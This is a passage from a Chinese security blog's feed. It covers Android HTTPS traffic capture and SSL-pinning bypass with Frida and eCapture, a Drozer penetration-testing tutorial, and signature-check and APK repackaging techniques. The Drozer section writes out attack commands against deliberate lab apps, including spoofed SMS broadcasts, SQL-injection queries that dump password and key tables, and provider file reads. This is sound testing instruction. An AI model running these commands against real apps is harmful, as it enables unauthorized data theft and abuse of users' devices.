class="string">&quot;PKCS12&quot;</span>);</span><br><span class="line">            keyStore.load(client_input, KEY_STORE_PASSWORD.toCharArray());</span><br><span class="line">            KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());</span><br><span class="line">            keyManagerFactory.init(keyStore, KEY_STORE_PASSWORD.toCharArray());</span><br><span class="line">            sslContext.init(keyManagerFactory.getKeyManagers(), <span class="keyword">null</span>, <span class="keyword">new</span> SecureRandom());</span><br><span class="line">            <span class="keyword">return</span> sslContext.getSocketFactory();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                client_input.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双向校验时，要将SSLPinning与服务器校验客户端证书的模块同时开启。</p><p>对其就行绕过，需要先启动Frida进行hook，然后勾选上客户端证书，才可以请求成功。如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image-1646650012489.png" alt="Image"></p><p>没勾选就会请求失败，出现400 Bad Request，和浏览器无代理时请求的结果一样，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image-1646650020395.png" alt="Image"></p><p>此时burp代理日志显示如下，SSL请求失败</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image-1646649990929.png" alt="Image"></p><h3 id="WebView证书校验"><a href="#WebView证书校验" class="headerlink" title="WebView证书校验"></a>WebView证书校验</h3><p>webview也是一种请求方式，相当于页面的跳转或嵌入，请求的结果会显示在主屏幕上。</p><p>对于webview证书校验，有些可以找到的脚本不一定有绕过，所以在使用的过程中要查看是否含有webview的关键信息</p><p>这里我使用的是<a href="https://github.com/WooyunDota/DroidSSLUnpinning">DroidSSLUnpinning</a></p><p>使用效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image-1646650832557.png" alt="Image"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image-1646650839159.png" alt="Image"></p><p>此时的APP绑定场景为：OKhttp请求为双向校验，webview为SSLPinning校验。所以在图中的上面一行是okhttp的请求结果，下面的是webview的请求结果，此脚本双向校验仍然可以绕过。</p><p>如果说webview再添加了客户端校验，那么在反编译apk后，需要找到webview访问域名的证书密钥，再安装进burp中即可。</p><h2 id="6-ssl-logger通杀"><a href="#6-ssl-logger通杀" class="headerlink" title="6.ssl_logger通杀"></a>6.ssl_logger通杀</h2><p> 至此，我们可以绕过证书绑定，抓APP发出的https包了，然而上述的证书解绑hook工具仅仅是通过hook了几种绑定证书的API，不适用于新出现或者非主流的证书绑定技术。这时，就需要神器<strong>ssl_logger</strong> </p><p>是用来解密SSL流量的工具，也是一款基于frida的hook工具，通过hook libssl库中的SSL_read、SSL_write等函数来实现流量解密，由于底层的实现会调用这几个函数来封装，所以可以直接解出流量数据。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20220307185359590.png" alt="image-20220307185359590"></p><p><a href="https://github.com/r0ysue/r0capture">r0capture</a>是r0ysue大佬在其基础上进行改进的一款工具。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20220307185253814.png" alt="image-20220307185253814"></p><p>由于ssl_logger是适用于MAC和linux操作系统，所以我选择在kali上进行hook实现双向校验的app </p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image-ecapture.png" alt="Image"></p><p>打开抓到的1.pcap包</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image-1cap%20-%20%E5%89%AF%E6%9C%AC.png" alt="Image"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/Image-1646650502638.png" alt="Image"></p><p>从图中可以看出成功的获取到了信息，是不是感觉这个工具特别神，但是看pcap的包总归不如看burp的一目了然，这个工具就这一点不太友好。</p><h2 id="7-eBPF-hook-免CA证书"><a href="#7-eBPF-hook-免CA证书" class="headerlink" title="7.eBPF hook 免CA证书"></a>7.eBPF hook 免CA证书</h2><p><a href="https://github.com/ehids/ecapture">ecapture</a> ：eBPF HOOK uprobe实现的各种用户态进程的数据捕获，无需改动原程序。这个工具也是通过hook了<code>libssl</code>库中<code>SSL_write</code>、<code>SSL_read</code> 这两个关键的SSL加密函数的返回值，拿到明文信息，通过ebpf map传递给用户进程。在APP中，如果遇到场景是burp抓包时出现证书报错，我觉得可以尝试一下用这个工具直接curl访问进行抓包。eBPF hook也是最近才发现的hook方法，值得我们去深入探索。</p><p>我这里用的是作者v0.1.3版本发布的工具，使用效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20220322204531014.png" alt="image-20220322204531014"></p><h2 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.总结</h2><ul><li>在依靠系统或默认浏览器校验证书的情况下，导入burp证书为用户证书是可以抓https包的</li><li>当app支持的最小API为24（Android 7.0）或以上时，默认情况下app只信任系统级别的证书，需要把burp变为系统证书</li><li>自签名证书作为系统证书时，有效期最长不超过825天，用户证书则没有限制</li><li>开启证书校验的APP在使用burp抓包时会报 <code>certtificate_unknown</code> 等错误</li><li>使用frida hook绕过双向证书校验时，必须要将客户端的p12文件导入burp中</li><li>一些脚本仍绕不过可以使用ssl_logger或者逆向代码进行分析验证逻辑，再有针对性的绕过</li><li>p12文件的密钥如果在so层，需要会用IDA进行静态分析lib下的so文件获取关键密钥</li></ul><h2 id="9-参考文章"><a href="#9-参考文章" class="headerlink" title="9.参考文章"></a>9.参考文章</h2><p><a href="https://ch3nye.top/Android-HTTPS%E8%AE%A4%E8%AF%81%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%92%8C%E5%AF%B9%E6%8A%97%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">Android HTTPS认证的N种方式和对抗方法总结</a>  </p><p>参考了此文章的项目按照自己的想法进行了些许改进的项目地址：<a href="https://github.com/dummersoul/SafeHttpsTest">Safehttps</a></p><p><a href="https://mabin004.github.io/2018/03/05/https%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/">Android Https抓包实践</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android渗透工具Drozer的使用</title>
      <link href="2023/11/28/Android%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7Drozer%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>2023/11/28/Android%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7Drozer%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><p>Drozer是专属于app的移动端渗透测试工具，分别需要装在PC端成为控制台，装在移动端作为代理APP，通过IPC的通信，动态的发现被测试APP的安全风险。</p><p>实际上就是检测AndroidManifest.xml文件，并对其进行四大控件的可能存在的安全隐患进行检测</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h3><p>下载地址：<a href="https://labs.f-secure.com/tools/drozer/">https://labs.f-secure.com/tools/drozer/</a></p><p>Agent放在模拟器（真机）上，msi在PC端安装</p><p>移动端的drozer，点击<code>开启</code>按钮，打开后它会监听31415端口</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211118144705726.png" alt="image-20211118144705726"></p><p>PC端双击安装，<code>一定要选择安装到Python2的目录下</code>，然后不断下一步即可，最后drozer会安装在python下的script路径中</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211118145022341.png" alt="image-20211118145022341"></p><p>安装需要的第三方库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2   -m   pip   install   protobuf</span><br><span class="line">python2   -m   pip   install   pyOpenSSL</span><br><span class="line">python2   -m   pip   install   twisted</span><br><span class="line">python2   -m   pip   install   service_identity</span><br></pre></td></tr></table></figure><h3 id="进入Drozer控制台"><a href="#进入Drozer控制台" class="headerlink" title="进入Drozer控制台"></a>进入Drozer控制台</h3><p>使用 adb 进行端口转发，转发到上边Drozer使用的端口 31415，并进入Drozer 控制台</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br><span class="line">drozer console connect</span><br></pre></td></tr></table></figure><h2 id="Drozer的使用"><a href="#Drozer的使用" class="headerlink" title="Drozer的使用"></a>Drozer的使用</h2><blockquote><p>先 list 查看支持哪些模块，然后help module_name或者run module_name -h查看各module的用法，最后，通过run module_name module_options来对app进行检测。</p></blockquote><h3 id="获取要检测的app的包名"><a href="#获取要检测的app的包名" class="headerlink" title="获取要检测的app的包名"></a>获取要检测的app的包名</h3><ul><li>run app.package.list   列出模拟器设备中所有已经安装的App包</li></ul><h3 id="查看包信息"><a href="#查看包信息" class="headerlink" title="查看包信息"></a>查看包信息</h3><ul><li>run app.package.info -a package_name    查看安装包的一些信息,例如版本信息，数据存储的目录，用户ID,组ID,是否有共享库，还有权限信息</li></ul><h3 id="识别攻击面"><a href="#识别攻击面" class="headerlink" title="识别攻击面"></a>识别攻击面</h3><blockquote><p>所谓攻击面，应该就是指可export的安卓四大组件（activaty、broadcast receiver、content provider、service）如果查看到四大组件中有可export的，就去具体看可export的组件有没有问题。</p></blockquote><ul><li>run app.package.attacksurface package_name    确定攻击面（暴露面）</li></ul><h3 id="查看activity组件信息"><a href="#查看activity组件信息" class="headerlink" title="查看activity组件信息"></a>查看activity组件信息</h3><blockquote><p>应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity之间通过Intent进行通信。在Intent的描述结构中，有两个最重要的部分：动作和动作对应的数据</p></blockquote><ul><li>run app.activity.info -a package_name  查看哪些组件能被导出</li></ul><h4 id="使用app-activity-start对activity组件进行检测"><a href="#使用app-activity-start对activity组件进行检测" class="headerlink" title="使用app.activity.start对activity组件进行检测"></a>使用app.activity.start对activity组件进行检测</h4><ul><li>run app.activity.start –component com.xxx.xxxx   com.xx.xxxx.<code>biz.home.HomeActivity</code> 对上述每个组件可被导出进行利用（红色的字体为前面检测出来的可被导出的部分模块针对性的检测，意思是可能存绕过前端需要输入密码的界面的越权漏洞）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure><h3 id="查看对外的Broadcast组件信息"><a href="#查看对外的Broadcast组件信息" class="headerlink" title="查看对外的Broadcast组件信息"></a>查看对外的Broadcast组件信息</h3><blockquote><p>BroadcastReceive广播接收器应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice  来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。</p></blockquote><ul><li>run app.broadcast.info -a [package name]      检查广播接口暴露 </li></ul><h4 id="使用app-broadcast-send对Broadcast组件进行检测"><a href="#使用app-broadcast-send对Broadcast组件进行检测" class="headerlink" title="使用app.broadcast.send对Broadcast组件进行检测"></a>使用app.broadcast.send对Broadcast组件进行检测</h4><ul><li>run app.broadcast.send –component [package name] [component name] –extra [type] [key] [value]</li><li>run app.broadcast.sniff –action [action]</li></ul><p>查看反编译出的AndroidManifest.xml文件，可看到将receiver的exported设置未进行设置。说明存在越权问题，可发送恶意广播，伪造消息等等。</p><p>反编译查看源代码，发现需要两个参数<code>phoneNumber</code>和<code>message</code>。(org.owasp.goatdroid.fourgoats为包名)</p><h5 id="发送恶意广播"><a href="#发送恶意广播" class="headerlink" title="发送恶意广播"></a>发送恶意广播</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message pwnd!</span><br></pre></td></tr></table></figure><h5 id="拒绝服务攻击检测"><a href="#拒绝服务攻击检测" class="headerlink" title="拒绝服务攻击检测"></a>拒绝服务攻击检测</h5><p>尝试拒绝服务攻击检测，向广播组件发送不完整intent使用空extras，可看到应用停止运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span><br></pre></td></tr></table></figure><h3 id="查看service组件信息"><a href="#查看service组件信息" class="headerlink" title="查看service组件信息"></a>查看service组件信息</h3><blockquote><p>一个Service 是一段长生命周期的，没有用户界面的程序，可以用来开发如监控类程序。较好的一个例子就是一个正在从播放列表中播放歌曲的媒体播放器。在一个媒体播放器的应用中，应该会有多个activity，让使用者可以选择歌曲并播放歌曲。</p></blockquote><ul><li>run app.service.info -a package_name</li></ul><h4 id="对service组件进行检测"><a href="#对service组件进行检测" class="headerlink" title="对service组件进行检测"></a>对service组件进行检测</h4><ul><li>run app.service.start –action [action] –component [package name] [component name]</li><li>run app.service.send [package name] [component name] –msg [what] [arg1] [arg2] –extra [type] [key] [value] –bundle-as-obj</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService</span><br></pre></td></tr></table></figure><h3 id="查看content-provider组件信息"><a href="#查看content-provider组件信息" class="headerlink" title="查看content provider组件信息"></a>查看content provider组件信息</h3><blockquote><p>android平台提供了Content  Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。</p></blockquote><ul><li>run app.provider.info -a package_name</li></ul><h4 id="对content组件进行检测"><a href="#对content组件进行检测" class="headerlink" title="对content组件进行检测"></a>对content组件进行检测</h4><ul><li>run scanner.provider.injection -a com.xxx.xzxx  查看是否存在sql注入</li><li>run scanner.provider.injection   检查所有的APP是否存在sql注入</li><li>run scanner.provider.traversal -a com.xxx.xzxx   查看是否存在目录遍历</li><li>run scanner.provider.finduris -a com.xxx.xzxx   查看是否存在数据泄露</li></ul><p>例子：</p><p>访问URI看敏感信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/fed1a5d195a82d0b865f7cc1c3166d8b.png" alt="img"></p><p>使用以下语句进行测试发现报错，说明存在SQL注入漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/  --projection &quot;&#x27;&quot; </span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/  --selection  &quot;&#x27;&quot; </span><br></pre></td></tr></table></figure><p><strong>列出所有表信息</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot; </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/33f95b1d7b24b768fb87fa4fcd214fb2.png" alt="img"></p><p><strong>获取具体表信息</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/d92fb7662f07d47ccbda73082efa9550.png" alt="img"></p><ul><li><p>文件读取   run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts </p></li><li><p>文件下载   run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data</p></li></ul><h2 id="命令总结"><a href="#命令总结" class="headerlink" title="命令总结"></a>命令总结</h2><p><strong>列出包名及信息</strong></p><p>run app.package.list</p><p>run app.package.info -a package_name </p><p><strong>检测攻击面</strong></p><p>run app.package.attacksurface [package name]</p><p><strong>攻击activity：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a [package name]</span><br><span class="line"></span><br><span class="line">run app.activity.start --component [package name] [component name]</span><br></pre></td></tr></table></figure><p><strong>攻击Content Provider（注入和遍历）：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.info -a [package name]</span><br><span class="line"></span><br><span class="line">run scanner.provider.finduris -a [package name]</span><br><span class="line"></span><br><span class="line">run app.provider.query [uri]</span><br><span class="line"></span><br><span class="line">run app.provider.update [uri] --selection [conditions] [selection arg] [column] [data]</span><br><span class="line"></span><br><span class="line">run scanner.provider.sqltables -a [package name]</span><br><span class="line"></span><br><span class="line">run scanner.provider.injection -a [package name]</span><br><span class="line"></span><br><span class="line">run scanner.provider.traversal -a [package name]</span><br></pre></td></tr></table></figure><p><strong>攻击Broadcast Receivers：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.info -a [package name]</span><br><span class="line">run app.broadcast.send --component [package name] [component name] --extra [<span class="built_in">type</span>] [key] [value]</span><br><span class="line">run app.broadcast.sniff --action [action]</span><br></pre></td></tr></table></figure><p><strong>攻击Service：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info -a [package name]</span><br><span class="line">run app.service.start --action [action] --component [package name] [component name]</span><br><span class="line">run app.service.send [package name] [component name] --msg [what] [arg1] [arg2] --extra [<span class="built_in">type</span>] [key] [value] --bundle-as-obj</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://zhuanlan.zhihu.com/p/74174735">移动安全之Android应用安全测试入门</a></p><p><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf">Drozer 使用指南</a></p><p><a href="https://blog.csdn.net/tabactivity/article/details/108851268">Android安全测试框架Drozer（使用篇）</a></p><p>中文乱码问题参考：<a href="https://www.jianshu.com/p/4c563c91431d">https://www.jianshu.com/p/4c563c91431d</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android签名校验</title>
      <link href="2023/11/28/Android%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C/"/>
      <url>2023/11/28/Android%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>签名是Android软件的一种有效身份标识，因为签名所使用的秘钥文件是我们所独有的，而我们APP被重新打包后，APP的签名信息势必会被篡改，所以我们就可以根据软件运行时签名与发布时的签名的相同与否来绝对是否需要将APP中止运行。</p></blockquote><h2 id="Java层签名校验方法"><a href="#Java层签名校验方法" class="headerlink" title="Java层签名校验方法"></a>Java层签名校验方法</h2><h3 id="签名校验"><a href="#签名校验" class="headerlink" title="签名校验"></a>签名校验</h3><p>Android SDK中提供了检测软件签名的方法，我们可以使用签名对象的 hashCode() 方法来获取一个Hash值，在代码中比较它的值即可，下面是获取当前运行时的签名信息代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getSignature</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        PackageManager pm = context.getPackageManager();</span><br><span class="line">        PackageInfo pi;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="comment">// 获取签名信息</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            pi = pm.getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES);</span><br><span class="line">            Signature[] signatures = pi.signatures;</span><br><span class="line">            <span class="keyword">for</span> (Signature signature : signatures) &#123;</span><br><span class="line">                sb.append(signature.toCharsString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString().hashCode();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接下来我们需要跟我们发布时的签名信息比较，在这里已经把Hash值MD5加密了:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> signature = getSignature(getApplicationContext());</span><br><span class="line">    <span class="keyword">if</span>(!MD5Util.getMD5(String.valueOf(signature)).equals(<span class="string">&quot;发布时签名值&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">// 可能被重编译了，需要退出</span></span><br><span class="line">        android.os.Process.killProcess(android.os.Process.myPid());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="classes-dex的crc32校验"><a href="#classes-dex的crc32校验" class="headerlink" title="classes.dex的crc32校验"></a>classes.dex的crc32校验</h3><p>通常重编译 apk 就是重编译 classes 文件，而代码重新编译后，生成的 classes.dex 文件的Hash值就会改变，所以我们可以检查程序安装后 classes.dex 文件的Hash值来判断软件是否被重新打包过。</p><p>至于Hash算法MD5和CRC都可以，在这里就直接使用CRC算法获取当前运行的app的crc32值了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">getApkCRC</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        ZipFile zf;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            zf = <span class="keyword">new</span> ZipFile(context.getPackageCodePath());</span><br><span class="line">            <span class="comment">// 获取apk安装后的路径</span></span><br><span class="line">            ZipEntry ze = zf.getEntry(<span class="string">&quot;classes.dex&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ze.getCrc();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>有了当前的crc32值了，那么我们只需要将其与我们app发布时的crc32原始值做比较了，这是我们的java逻辑，R.string.classes_txt 的值我们我们可以先随意赋予一个（不影响），随后AndroidStudio开始正式打包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String srcStr = MD5Util.getMD5(String.valueOf(CommentUtils.getApkCRC(getApplicationContext())));</span><br><span class="line">    <span class="keyword">if</span>(!srcStr.equals(getString(R.string.classes_txt)))&#123;</span><br><span class="line">        <span class="comment">// 可能被重编译了，需要退出</span></span><br><span class="line">        android.os.Process.killProcess(android.os.Process.myPid());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当打包成功后，我们获取apk的classes.dex的crc32值，随后将该crc32值赋予R.string.classes_txt，最后通过AndroidStudio再重新打包即可（因为更改资源文件并不会改变classe.dex的crc32值，改变代码才会）。获取classes.dex的crc32值的方法，可使用工具如下：</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211116102506420.png" alt="image-20211116102506420"></p><p>Java层面的校验方法都是脆弱的，因为破解者可以直接更改我们的判断逻辑以达到绕开校验的目的，所以我们只能通过增加其破解工作量，来达到一点点防破解的夙愿。</p><blockquote><p>建议将crc32值或签名的hash值进行MD5加密，在代码中使用加密后的值进行比较，防止反编译后的全局搜索；建议将签名校验与  classes.dex 校验结合起来使用，先进行签名校验，校验成功后将正确签名hash值作为参数去后台请求 classes.dex  的crc32值，再与当前运行crc32值进行比较；建议进行多处校验，每处使用变形判断语句，并与其他判断条件组合使用，以增加破解时的工作量。</p></blockquote><h2 id="反编译与二次打包"><a href="#反编译与二次打包" class="headerlink" title="反编译与二次打包"></a>反编译与二次打包</h2><h3 id="apk反编译"><a href="#apk反编译" class="headerlink" title="apk反编译"></a>apk反编译</h3><ul><li>apktool d xx.apk   得到一个同名文件夹，里面是smali文件</li><li>apktool d -s xx.apk -o xx   指定的目录下里面是dex文件</li></ul><blockquote><p>如果不指定 -s 参数，反编译出来的就是smali代码<br>    smali文件是dex文件反编译的结果，但不同于dex2jar的反编译过程</p></blockquote><h3 id="二次打包"><a href="#二次打包" class="headerlink" title="二次打包"></a>二次打包</h3><blockquote><p>由smali语言即Davlik的寄存器语言，smali有自己的语法并且可以修改，修改后可以被二次打包为apk</p></blockquote><ul><li>apktool b 需要编译的文件夹</li></ul><blockquote><p>如遇到报错：No resource identifier found for attribute ‘keyboardNavigationCluster’ in package ‘android’</p><p>解决方法：将 C:\Users\用户\AppData\Local\apktool\framework\1.apk文件删除，重新打包一次即可，该处又会重新生成新的1.apk</p><p>我们二次打包好的apk会在要编译的文件夹下新生成的dist目录下，但是这个apk文件由于没有进行过签名，所以是不能够安装和运行的</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211116110523854.png" alt="image-20211116110523854"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211116110440597.png" alt="image-20211116110440597"></p><h3 id="使用Auto-sign对二次打包后的apk文件进行签名"><a href="#使用Auto-sign对二次打包后的apk文件进行签名" class="headerlink" title="使用Auto-sign对二次打包后的apk文件进行签名"></a>使用Auto-sign对二次打包后的apk文件进行签名</h3><ul><li><p>Auto-sign工具下载好放在apktool所在目录下</p></li><li><p>将我们待签名的apk文件复制到Auto-sign目录之下，并更改名称为<code>update.zip</code> </p></li><li><p>双击<code>Sign.bat</code>文件，将同目录下生成的update_signed.zip文件更改为xx.apk文件即可，这就是签名后的apk</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211116112018582.png" alt="image-20211116112018582"></p></li></ul><blockquote><p>如果app没有做签名校验，那么重新打包后的apk与原始apk功能完全一样（我自己测试的apk是存在签名校验的，能安装但是打不开APP）</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211116112323389.png" 